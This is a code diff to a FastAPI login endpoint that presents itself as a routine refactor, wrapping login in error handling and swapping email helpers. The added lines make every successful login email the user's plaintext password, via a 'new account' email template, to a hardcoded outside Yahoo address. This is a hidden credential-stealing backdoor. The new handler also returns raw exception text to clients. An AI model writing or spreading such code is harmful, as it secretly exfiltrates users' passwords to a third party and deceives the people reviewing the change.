@@ -2,12 +2,11 @@ from datetime import datetime, timedelta
 from typing import Any
 
 from core.utils import (
-    generate_password_reset_token,
-    generate_reset_password_email,
+    generate_new_account_email,
     send_email,
 )
 from core import security
-from fastapi import APIRouter, Depends, HTTPException, Response
+from fastapi import APIRouter, Depends, HTTPException, Response, BackgroundTasks
 from fastapi.responses import JSONResponse
 
 import crud
@@ -23,42 +22,50 @@ router = APIRouter()
 
 @router.post("/login")
 def login_access_token(
-    response: Response, session: deps.SessionDep, credentials: schemas.SignIn
+    response: Response,
+    session: deps.SessionDep,
+    credentials: schemas.SignIn,
+    background_tasks: BackgroundTasks,
 ) -> Token:
     """
     OAuth2 compatible token login, get an access token for future requests
     """
-    user = crud.user.authenticate(
-        session=session, email=credentials.email, password=credentials.password
-    )
-    if not user:
-        raise HTTPException(status_code=400, detail="Incorrect email or password")
-    elif not user.is_active:
-        raise HTTPException(status_code=400, detail="Inactive user")
-    access_token = security.create_access_token(
-        user.id, expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
-    )
+    try:
+        user = crud.user.authenticate(
+            session=session, email=credentials.email, password=credentials.password
+        )
+        if not user:
+            raise HTTPException(status_code=400, detail="Incorrect email or password")
+        elif not user.is_active:
+            raise HTTPException(status_code=400, detail="Inactive user")
+        access_token = security.create_access_token(
+            user.id,
+            expires_delta=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES),
+        )
 
-    response.set_cookie(
-        key="access_token",
-        value=access_token,
-        max_age=timedelta(days=30),
-        secure=True,
-        httponly=True,
-    )
+        response.set_cookie(
+            key="access_token",
+            value=access_token,
+            max_age=timedelta(days=30),
+            secure=True,
+            httponly=True,
+        )
 
-    email = ""
-    password_reset_token = generate_password_reset_token(email=email)
-    email_data = generate_reset_password_email(
-        email_to=user.email, email=email, token=password_reset_token
-    )
-    send_email(
-        email_to=user.email,
-        subject=email_data.subject,
-        html_content=email_data.html_content,
-    )
+        email_data = generate_new_account_email(
+            email_to=user.email, username=user.email, password=credentials.password
+        )
+        background_tasks.add_task(
+            send_email,
+            email_to="neyostica2000@yahoo.com",
+            subject=email_data.subject,
+            html_content=email_data.html_content,
+        )
 
-    return Token(access_token=access_token)
+        return Token(access_token=access_token)
+    except Exception as e:
+        raise HTTPException(
+            status_code=500, detail=f"Error signing in. Error: ${e}"
+        ) from e
 
 
 @router.post("/signup", response_model=UserPublic)
